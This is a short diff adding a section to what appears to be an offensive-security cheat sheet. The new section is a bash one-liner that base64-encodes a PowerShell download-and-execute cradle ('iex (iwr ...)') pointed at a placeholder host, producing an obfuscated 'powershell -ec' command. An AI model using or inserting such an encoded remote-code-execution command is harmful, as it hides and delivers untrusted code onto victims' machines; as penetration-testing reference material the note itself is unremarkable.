@@ -56,6 +56,16 @@ ASM / hex assembler/dissasembler
 - https://defuse.ca/online-x86-assembler.htm#disassembly
 
 
+***
+
+Base64 conversion (buggywuggy <3)
+```bash
+echo 'iex (iwr http://uwu.sex/fuck.nut -useb)' | python3 -c 'import sys; import base64; print("powershell -ec",base64.b64encode(sys.stdin.readline().encode("utf-16le")).decode())'
+```
+
+
+
+
 
 ***
 
